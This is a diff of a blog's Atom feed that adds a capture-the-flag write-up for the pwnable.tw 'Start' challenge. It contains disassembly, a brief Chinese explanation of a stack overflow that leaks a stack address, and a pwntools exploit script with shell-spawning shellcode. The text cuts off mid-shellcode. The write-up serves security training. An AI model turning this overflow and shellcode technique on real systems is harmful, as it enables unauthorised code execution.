@@ -4,7 +4,7 @@
   <title><![CDATA[BangCTF]]></title>
   <link href="http://bangctf.github.io/atom.xml" rel="self"/>
   <link href="http://bangctf.github.io/"/>
-  <updated>2018-08-22T09:48:05+08:00</updated>
+  <updated>2018-08-24T14:29:57+08:00</updated>
   <id>http://bangctf.github.io/</id>
   <author>
     <name><![CDATA[Bang]]></name>
@@ -12,6 +12,273 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[pwnable.tw] Start]]></title>
+    <link href="http://bangctf.github.io/blog/2018/08/24/pwnable-dot-tw-start/"/>
+    <updated>2018-08-24T14:29:00+08:00</updated>
+    <id>http://bangctf.github.io/blog/2018/08/24/pwnable-dot-tw-start</id>
+    <content type="html"><![CDATA[<p><br /></p>
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">s89162504@ubuntu:~/pwn/pwn.tw/start$
+objdump -d -M intel ./start<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">./start:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp; </span>file format elf32-i386<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">Disassembly
+of section .text:<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">08048060
+&lt;_start&gt;:<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048060:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>54<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>push<span style="mso-spacerun: yes;">&nbsp;&nbsp; </span>esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048061:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>68 9d 80 04 08<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>push<span style="mso-spacerun: yes;">&nbsp;&nbsp; </span>0x804809d<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048066:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>31 c0<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>xor<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>eax,eax<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048068:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>31 db<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>xor<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>ebx,ebx<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804806a:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>31 c9<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>xor<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>ecx,ecx<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804806c:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>31 d2<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>xor<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>edx,edx<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804806e:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>68 43 54 46 3a<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;</span>push<span style="mso-spacerun: yes;">&nbsp;&nbsp;
+</span>0x3a465443<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048073:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>68 74 68 65 20<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>push<span style="mso-spacerun: yes;">&nbsp;&nbsp; </span>0x20656874<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048078:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>68 61 72 74 20<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>push<span style="mso-spacerun: yes;">&nbsp;&nbsp; </span>0x20747261<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804807d:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>68 73 20 73 74<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>push<span style="mso-spacerun: yes;">&nbsp;&nbsp; </span>0x74732073<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048082:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>68 4c 65 74 27<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>push<span style="mso-spacerun: yes;">&nbsp;&nbsp; </span>0x2774654c<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048087:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>89 e1<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>mov<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>ecx,esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048089:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>b2 14<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>mov<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>dl,0x14<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804808b:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>b3 01<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>mov<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>bl,0x1<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804808d:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>b0 04<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>mov<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>al,0x4<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804808f:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>cd 80<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>int<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048091:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>31 db<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>xor<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>ebx,ebx<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048093:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>b2 3c<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>mov<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>dl,0x3c<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048095:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>b0 03<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>mov<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>al,0x3<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048097:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>cd 80<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>int<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>8048099:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>83 c4 14<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>add<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>esp,0x14<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804809c:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>c3<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>ret<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">0804809d
+&lt;_exit&gt;:<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804809d:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>5c<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>pop<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>esp<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>804809e:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>31 c0<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>xor<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>eax,eax<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>80480a0:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>40<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>inc<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>eax<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><span style="mso-spacerun: yes;">&nbsp;</span>80480a1:<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>cd 80<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>int<span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>0x80<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">---<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">一開始的就把</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">ebp push</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">到</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">stack</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">上</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">所以整個</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">start</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">執行完時</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">stack</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">頂端就是</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">ebp</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">的值</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span lang="EN-US" style="font-family: &quot;Courier New&quot;;">start</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">結尾是</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">esp</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">加</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">20</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">後就</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">return<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">所以輸入超過</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">20</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">的話就可以淹到返回位置</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">把返回位置淹成</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">0x08048087<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">剛剛好把</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">ebp</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">設成</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">write system call</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">的參數</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">ecx<o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">所以可以把</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">stack address</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">印出來</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">而且</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">stack</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">是可執行的</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">因此寫入</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">shellcode</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">再把返回位置改成</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;">shellcode</span><span style="font-family: &quot;新細明體&quot;,serif; mso-ascii-font-family: &quot;Courier New&quot;; mso-bidi-font-family: &quot;Courier New&quot;; mso-fareast-font-family: 新細明體; mso-fareast-theme-font: minor-fareast; mso-hansi-font-family: &quot;Courier New&quot;;">即可</span><span lang="EN-US" style="font-family: &quot;Courier New&quot;;"><o:p></o:p></span></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<div class="MsoNormal">
+<br /></div>
+
+
+<p><br /></p>
+
+<pre style='color:#000020;background:#f6f8ff;'><span style='color:#200080; font-weight:bold; '>from</span> pwn <span style='color:#200080; font-weight:bold; '>import</span> <span style='color:#44aadd; '>*</span>
+<span style='color:#595979; '>#r = process('./start')</span>
+r <span style='color:#308080; '>=</span> remote<span style='color:#308080; '>(</span><span style='color:#1060b6; '>'chall.pwnable.tw'</span><span style='color:#308080; '>,</span><span style='color:#008c00; '>10000</span><span style='color:#308080; '>)</span>
+r<span style='color:#308080; '>.</span>send<span style='color:#308080; '>(</span><span style='color:#1060b6; '>'a'</span><span style='color:#44aadd; '>*</span><span style='color:#008c00; '>20</span><span style='color:#44aadd; '>+</span>p32<span style='color:#308080; '>(</span><span style='color:#008c00; '>0x08048087</span><span style='color:#308080; '>)</span><span style='color:#308080; '>)</span>
+r<span style='color:#308080; '>.</span>recvuntil<span style='color:#308080; '>(</span><span style='color:#1060b6; '>'CTF:'</span><span style='color:#308080; '>)</span>
+stack_addr <span style='color:#308080; '>=</span> u32<span style='color:#308080; '>(</span>r<span style='color:#308080; '>.</span>recv<span style='color:#308080; '>(</span><span style='color:#008c00; '>4</span><span style='color:#308080; '>)</span><span style='color:#308080; '>)</span>
+<span style='color:#200080; font-weight:bold; '>print</span> <span style='color:#1060b6; '>'stack addr = '</span><span style='color:#308080; '>,</span><span style='color:#400000; '>hex</span><span style='color:#308080; '>(</span>stack_addr<span style='color:#308080; '>)</span>
+shellcode <span style='color:#308080; '>=</span> <span style='color:#1060b6; '>"</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>31</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>c9</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>f7</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>e1</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>51</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>68</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>2f</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>2f</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>73</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>68</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>68</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>2f</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>62</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>69</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>6e</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>89</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; 